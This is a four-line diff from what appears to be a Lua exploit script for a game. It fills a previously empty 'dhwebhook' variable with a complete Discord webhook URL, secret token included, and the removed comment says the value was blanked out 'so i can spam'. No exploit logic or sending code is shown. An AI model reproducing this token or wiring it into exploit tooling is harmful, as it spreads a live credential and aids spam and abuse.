@@ -1,4 +1,4 @@
-local dhwebhook = "" -- Blocked out so i can spam :
+local dhwebhook = "https://discord.com/api/webhooks/1065272192268517517/jxauSPmcQstDwEOmQI-VhbOzHk5V1RKxnajzJglFj9Tp7GX2WTNywQMd0OYjNcp4-Faa"
 local dhuser = 
 
 local exploit
